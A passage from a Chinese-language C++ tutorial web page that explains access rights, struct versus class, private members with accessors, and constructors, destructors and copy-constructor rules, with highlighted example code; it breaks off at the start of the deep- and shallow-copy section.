class="comment">//p.m_Car = &quot;奔驰&quot;;  //保护权限类外访问不到</span></span><br><span class="line"><span class="comment">//p.m_Password = 123; //私有权限类外访问不到</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-1-2-struct-和-class-区别">4.1.2 struct 和 class 区别</h4><p>在 C++中 struct 和 class 唯一的<strong>区别</strong>就在于 <strong>默认的访问权限不同</strong></p><p>区别：</p><ul><li>struct 默认权限为公共</li><li>class   默认权限为私有</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span>  m_A; <span class="comment">//默认是私有权限</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">C2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> m_A;  <span class="comment">//默认是公共权限</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">C1 c1;</span><br><span class="line">c1.m_A = <span class="number">10</span>; <span class="comment">//错误，访问权限是私有</span></span><br><span class="line"></span><br><span class="line">C2 c2;</span><br><span class="line">c2.m_A = <span class="number">10</span>; <span class="comment">//正确，访问权限是公共</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-1-3-成员属性设置为私有">4.1.3 成员属性设置为私有</h4><p>**优点 1：**将所有成员属性设置为私有，可以自己控制读写权限</p><p>**优点 2：**对于写权限，我们可以检测数据的有效性</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="comment">//姓名设置可读可写</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setName</span><span class="params">(<span class="built_in">string</span> name)</span> &#123;</span><br><span class="line">m_Name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_Name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取年龄</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> m_Age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置年龄</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (age &lt; <span class="number">0</span> || age &gt; <span class="number">150</span>) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;你个老妖精!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_Age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//情人设置为只写</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setLover</span><span class="params">(<span class="built_in">string</span> lover)</span> &#123;</span><br><span class="line">m_Lover = lover;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"><span class="built_in">string</span> m_Name; <span class="comment">//可读可写  姓名</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> m_Age; <span class="comment">//只读  年龄</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> m_Lover; <span class="comment">//只写  情人</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Person p;</span><br><span class="line"><span class="comment">//姓名设置</span></span><br><span class="line">p.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.getName() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//年龄设置</span></span><br><span class="line">p.setAge(<span class="number">50</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;年龄： &quot;</span> &lt;&lt; p.getAge() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//情人设置</span></span><br><span class="line">p.setLover(<span class="string">&quot;苍井&quot;</span>);</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;情人： &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  //只写属性，不可以读取</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>练习案例 1：设计立方体类</strong></p><p>设计立方体类(Cube)</p><p>求出立方体的面积和体积</p><p>分别用全局函数和成员函数判断两个立方体是否相等。</p><p><strong>练习案例 2：点和圆的关系</strong></p><p>设计一个圆形类（Circle），和一个点类（Point），计算点和圆的关系。</p><h3 id="4-2-对象的初始化和清理">4.2 对象的初始化和清理</h3><ul><li>生活中我们买的电子产品都基本会有出厂设置，在某一天我们不用时候也会删除一些自己信息数据保证安全</li><li>C++中的面向对象来源于生活，每个对象也都会有初始设置以及 对象销毁前的清理数据的设置。</li></ul><h4 id="4-2-1-构造函数和析构函数">4.2.1 构造函数和析构函数</h4><p>对象的<strong>初始化和清理</strong>也是两个非常重要的安全问题</p><pre><code>一个对象或者变量没有初始状态，对其使用后果是未知同样的使用完一个对象或变量，没有及时清理，也会造成一定的安全问题</code></pre><p>c++利用了<strong>构造函数</strong>和<strong>析构函数</strong>解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。</p><p>对象的初始化和清理工作是编译器强制要我们做的事情，因此如果<strong>我们不提供构造和析构，编译器会提供</strong></p><p><strong>编译器提供的构造函数和析构函数是空实现。</strong></p><ul><li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li><li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li></ul><p><strong>构造函数语法：</strong><code>类名()&#123;&#125;</code></p><ol><li>构造函数，没有返回值也不写 void</li><li>函数名称与类名相同</li><li>构造函数可以有参数，因此可以发生重载</li><li>程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次</li></ol><p><strong>析构函数语法：</strong> <code>~类名()&#123;&#125;</code></p><ol><li>析构函数，没有返回值也不写 void</li><li>函数名称与类名相同,在名称前加上符号  ~</li><li>析构函数不可以有参数，因此不可以发生重载</li><li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person的析构函数调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-2-构造函数的分类及调用">4.2.2 构造函数的分类及调用</h4><p>两种分类方式：</p><pre><code>按参数分为： 有参构造和无参构造按类型分为： 普通构造和拷贝构造</code></pre><p>三种调用方式：</p><pre><code>括号法显示法隐式转换法</code></pre><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、构造函数分类</span></span><br><span class="line"><span class="comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span></span><br><span class="line"><span class="comment">// 按照类型分类分为 普通构造和拷贝构造</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//无参（默认）构造函数</span></span><br><span class="line">Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参构造函数</span></span><br><span class="line">Person(<span class="type">int</span> a) &#123;</span><br><span class="line">age = a;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拷贝构造函数</span></span><br><span class="line">Person(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">age = p.age;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、构造函数的调用</span></span><br><span class="line"><span class="comment">//调用无参构造函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line">Person p; <span class="comment">//调用无参构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用有参的构造函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.1  括号法，常用</span></span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">10</span>)</span>;</span><br><span class="line"><span class="comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span></span><br><span class="line"><span class="comment">//Person p2();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.2 显式法</span></span><br><span class="line">Person p2 = Person(<span class="number">10</span>);</span><br><span class="line">Person p3 = Person(p2);</span><br><span class="line"><span class="comment">//Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.3 隐式转换法</span></span><br><span class="line">Person p4 = <span class="number">10</span>; <span class="comment">// Person p4 = Person(10);</span></span><br><span class="line">Person p5 = p4; <span class="comment">// Person p5 = Person(p4);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span></span><br><span class="line"><span class="comment">//Person p5(p4);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"><span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-3-拷贝构造函数调用时机">4.2.3 拷贝构造函数调用时机</h4><p>C++中拷贝构造函数调用时机通常有三种情况</p><ul><li>使用一个已经创建完毕的对象来初始化一个新对象</li><li>值传递的方式给函数参数传值</li><li>以值方式返回局部对象</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">mAge = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Person(<span class="type">int</span> age) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">mAge = age;</span><br><span class="line">&#125;</span><br><span class="line">Person(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">mAge = p.mAge;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//析构函数在释放内存之前调用</span></span><br><span class="line">~Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 使用一个已经创建完毕的对象来初始化一个新对象</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">man</span><span class="params">(<span class="number">100</span>)</span>; <span class="comment">//p对象已经创建完毕</span></span><br><span class="line">Person <span class="title function_">newman</span><span class="params">(man)</span>; <span class="comment">//调用拷贝构造函数</span></span><br><span class="line">Person newman2 = man; <span class="comment">//拷贝构造</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person newman3;</span></span><br><span class="line"><span class="comment">//newman3 = man; //不是调用拷贝构造函数，赋值操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 值传递的方式给函数参数传值</span></span><br><span class="line"><span class="comment">//相当于Person p1 = p;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">doWork</span><span class="params">(Person p1)</span> &#123;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span> &#123;</span><br><span class="line">Person p; <span class="comment">//无参构造函数</span></span><br><span class="line">doWork(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 以值方式返回局部对象</span></span><br><span class="line">Person <span class="title function_">doWork2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person p1;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (<span class="type">int</span> *)&amp;p1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test03</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person p = doWork2();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (<span class="type">int</span> *)&amp;p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test01();</span></span><br><span class="line"><span class="comment">//test02();</span></span><br><span class="line">test03();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-4-构造函数调用规则">4.2.4 构造函数调用规则</h4><p>默认情况下，c++编译器至少给一个类添加 3 个函数</p><p>1．默认构造函数(无参，函数体为空)</p><p>2．默认析构函数(无参，函数体为空)</p><p>3．默认拷贝构造函数，对属性进行值拷贝</p><p>构造函数调用规则如下：</p><ul><li><p>如果用户定义有参构造函数，c++不在提供默认无参构造，但是会提供默认拷贝构造</p></li><li><p>如果用户定义拷贝构造函数，c++不会再提供其他构造函数</p></li></ul><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//无参（默认）构造函数</span></span><br><span class="line">Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参构造函数</span></span><br><span class="line">Person(<span class="type">int</span> a) &#123;</span><br><span class="line">age = a;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拷贝构造函数</span></span><br><span class="line">Person(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">age = p.age;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">18</span>)</span>;</span><br><span class="line"><span class="comment">//如果不写拷贝构造，编译器会自动添加拷贝构造，并且做浅拷贝操作</span></span><br><span class="line">Person <span class="title function_">p2</span><span class="params">(p1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2的年龄为： &quot;</span> &lt;&lt; p2.age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果用户提供有参构造，编译器不会提供默认构造，会提供拷贝构造</span></span><br><span class="line">Person p1; <span class="comment">//此时如果用户自己没有提供默认构造，会出错</span></span><br><span class="line">Person <span class="title function_">p2</span><span class="params">(<span class="number">10</span>)</span>; <span class="comment">//用户提供的有参</span></span><br><span class="line">Person <span class="title function_">p3</span><span class="params">(p2)</span>; <span class="comment">//此时如果用户没有提供拷贝构造，编译器会提供</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果用户提供拷贝构造，编译器不会提供其他构造函数</span></span><br><span class="line">Person p4; <span class="comment">//此时如果用户自己没有提供默认构造，会出错</span></span><br><span class="line">Person <span class="title function_">p5</span><span class="params">(<span class="number">10</span>)</span>; <span class="comment">//此时如果用户自己没有提供有参，会出错</span></span><br><span class="line">Person <span class="title function_">p6</span><span class="params">(p5)</span>; <span class="comment">//用户自己提供拷贝构造</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-5-深拷贝与浅拷贝">4.2.5 深拷贝与浅拷贝</h4><p>深浅拷贝是面试经典问题，也是常见的一个坑</p><p>浅拷贝：简单的赋值拷贝操作</p><p>深拷贝：在堆区重新申请空间，进行拷贝操作</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//无参（默认）构造函数</span></span><br><span class="line">Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参构造函数</span></span><br><span class="line">Person(<span class="type">int</span> age ,<span class="type">int</span> height) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> 